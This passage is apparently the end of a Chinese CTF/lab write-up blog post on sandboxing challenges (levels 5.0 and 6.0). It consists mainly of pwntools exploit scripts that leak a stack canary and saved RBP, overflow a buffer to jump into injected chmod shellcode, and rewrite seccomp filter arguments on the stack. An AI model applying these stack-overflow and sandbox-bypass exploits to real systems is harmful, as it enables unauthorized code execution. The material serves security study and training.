</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;REPEATaa&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x20</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>canary</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>r</span><span class=p>(</span><span class=mi>7</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;canary&#39;</span><span class=p>,</span> <span class=n>canary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x18</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>saved_rbp</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;saved rbp&#39;</span><span class=p>,</span> <span class=n>saved_rbp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chall1_buf</span> <span class=o>=</span> <span class=p>(</span><span class=n>saved_rbp</span> <span class=o>-</span> <span class=mh>0xe0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;chall1 buf&#39;</span><span class=p>,</span> <span class=n>chall1_buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>chall2_buf</span> <span class=o>=</span> <span class=n>chall1_buf</span> <span class=o>-</span> <span class=mh>0xa0</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;sc addr&#39;</span><span class=p>,</span> <span class=n>chall2_buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>val</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>canary</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x18</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>chall2_buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=60-1 class="relative group">6.0 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#60-1 aria-label=锚点>#</a></span></h3><p>在 5.0 的基础上需要把栈上的 seccomp 参数改成需要的系统调用号。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># chmod(&#34;a&#34;, 4)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov al, 0x5a  # chmod
</span></span></span><span class=line><span class=cl><span class=s2>push 0x61     # &#34;a&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov rdi, rsp  # rdi -&gt; &#34;a&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>mov sil, 4    # 4 -&gt; 000 000 100
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;REPEATaa&#39;</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x80</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>canary</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>+</span> <span class=n>r</span><span class=p>(</span><span class=mi>7</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;canary&#39;</span><span class=p>,</span> <span class=n>canary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x18</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>saved_rbp</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;saved rbp&#39;</span><span class=p>,</span> <span class=n>saved_rbp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>chall1_buf</span> <span class=o>=</span> <span class=p>(</span><span class=n>saved_rbp</span> <span class=o>-</span> <span class=mh>0x1a0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;chall1 buf&#39;</span><span class=p>,</span> <span class=n>chall1_buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>chall2_buf</span> <span class=o>=</span> <span class=n>chall1_buf</span> <span class=o>-</span> <span class=mh>0x100</span>
</span></span><span class=line><span class=cl><span class=n>leak</span><span class=p>(</span><span class=s1>&#39;sc addr&#39;</span><span class=p>,</span> <span class=n>chall2_buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x78</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x5a</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>4</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>canary</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x18</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>chall2_buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div></div></section><footer class="pt-8 max-w-prose print:hidden"><div class=flex><img class="w-24 h-24 !mt-0 !mb-0 ltr:mr-4 rtl:ml-4 rounded-full" width=96 height=96 alt=Mercury src=/my_avatar_huffcabec77dc887387e1e045311cbdc8b_49733_192x192_fill_box_smart1_3.png><div class=place-self-center><div class="text-[0.6rem] leading-3 text-neutral-500 dark:text-neutral-400 uppercase">作者</div><div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">Mercury</div><div class="text-sm text-neutral-700 dark:text-neutral-400">A student</div><div class="text-2xl sm:text-lg"><div class="flex flex-wrap text-neutral-400 dark:text-neutral-500"><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=mailto:signormercurio@gmail.com target=_blank aria-label=Email rel="me noopener noreferrer"><span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1-27.64 140.9 68.65 266.2 199.1 285.1 19.01 2.888 36.17-12.26 36.17-31.49l1e-4-.6631c0-15.74-11.44-28.88-26.84-31.24-84.35-12.98-149.2-86.13-149.2-174.2.0-102.9 88.61-185.5 193.4-175.4 91.54 8.869 158.6 91.25 158.6 183.2v16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98.0036c-7.299.0-13.2 4.992-15.12 11.68-24.85-12.15-54.24-16.38-86.06-5.106-38.75 13.73-68.12 48.91-73.72 89.64-9.483 69.01 43.81 128 110.9 128 26.44.0 50.43-9.544 69.59-24.88 24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3c0-149.2-133.9-265.632-287.3-235.57zM239.1 304.3c-26.47.0-48-21.56-48-48.05s21.53-48.05 48-48.05 48 21.56 48 48.05-20.6 48.05-48 48.05z"/></svg></span></a><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://github.com/SignorMercurio target=_blank aria-label=Github rel="me noopener noreferrer"><span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentcolor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></a><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://t.me/m9r_at_tG target=_blank aria-label=Telegram rel="me noopener noreferrer"><span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentcolor" d="M248 8C111.033 8 0 119.033.0 256S111.033 504 248 504 496 392.967 496 256 384.967 8 248 8zM362.952 176.66c-3.732 39.215-19.881 134.378-28.1 178.3-3.476 18.584-10.322 24.816-16.948 25.425-14.4 1.326-25.338-9.517-39.287-18.661-21.827-14.308-34.158-23.215-55.346-37.177-24.485-16.135-8.612-25 5.342-39.5 3.652-3.793 67.107-61.51 68.335-66.746.153-.655.3-3.1-1.154-4.384s-3.59-.849-5.135-.5q-3.283.746-104.608 69.142-14.845 10.194-26.894 9.934c-8.855-.191-25.888-5.006-38.551-9.123-15.531-5.048-27.875-7.717-26.8-16.291q.84-6.7 18.45-13.7 108.446-47.248 144.628-62.3c68.872-28.647 83.183-33.623 92.511-33.789 2.052-.034 6.639.474 9.61 2.885a10.452 10.452.0 013.53 6.716A43.765 43.765.0 01362.952 176.66z"/></svg></span></a></div></div></div></div><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span><a class="flex group" href=/posts/hugo/><span class="mr-3 ltr:inline rtl:hidden text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400">&larr;</span>
<span class="ml-3 ltr:hidden rtl:inline text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400">&rarr;</span>
<span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">乔迁新居：Hugo 博客的配置与部署</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime="2022-03-11 13:10:42 +0000 UTC">2022-03-11</time></span></span></a></span>
<span><a class="flex text-right group" href=/posts/pet/><span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">扑朔迷离：隐私增强技术实践</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime="2022-02-04 09:23:11 +0000 UTC">2022-02-04</time></span></span>
<span class="ml-3 ltr:inline rtl:hidden text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400">&rarr;</span>
<span class="mr-3 ltr:hidden rtl:inline text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400">&larr;</span></a></span></div></div></footer><script src=//unpkg.com/valine/dist/Valine.min.js></script><div id=vcomments class="mt-8 max-w-prose print:hidden"></div><script>new Valine({el:"#vcomments",appId:"RkxCznUcvfzFBgfMiMr0BAfd-gzGzoHsz",appKey:"sw2sEPOl4haCAXKUFYiBFMrR",avatar:"robohash",requiredFields:["nick"]})</script></article><div class="absolute top-[100vh] ltr:right-0 rtl:left-0 w-12 pointer-events-none bottom-0"><a href=#the-top class="w-12 h-12 sticky pointer-events-auto top-[calc(100vh-5.5rem)] bg-neutral/50 dark:bg-neutral-800/50 backdrop-blur rounded-full text-xl flex items-center justify-center text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer class="py-10 print:hidden"><nav class="pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex flex-col list-none sm:flex-row"><li class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=https://creativecommons.org/licenses/by-nc/4.0/ title>CC BY-NC 4.0</a></li></ul></nav><div class="flex items-center justify-between"><div><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2022
Mercury</p><p class="text-xs text-neutral-500 dark:text-neutral-400">由 <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://git.io/hugo-congo target=_blank rel="noopener noreferrer">Congo</a> 强力驱动</p></div><div class="text-sm cursor-pointer text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-14 rtl:ml-14"><button id=appearance-switcher class="w-12 h-12" type=button title=切换为深色模式>
<span class="inline dark:hidden"><span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></span><span class="hidden dark:inline"><span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></span></button></div></div></footer><div id=search-wrapper class="fixed inset-0 z-50 flex flex-col p-4 sm:p-6 md:p-[10vh] lg:p-[12vh] w-screen h-screen cursor-default bg-neutral-500/50 backdrop-blur-sm dark:bg-neutral-900/50 invisible" data-url=https://blog.sigmerc.top><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg border-neutral-200 top-20 bg-neutral dark:bg-neutral-800 dark:border-neutral-700"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative inline-block align-text-bottom icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-transparent focus:outline-2" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentcolor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>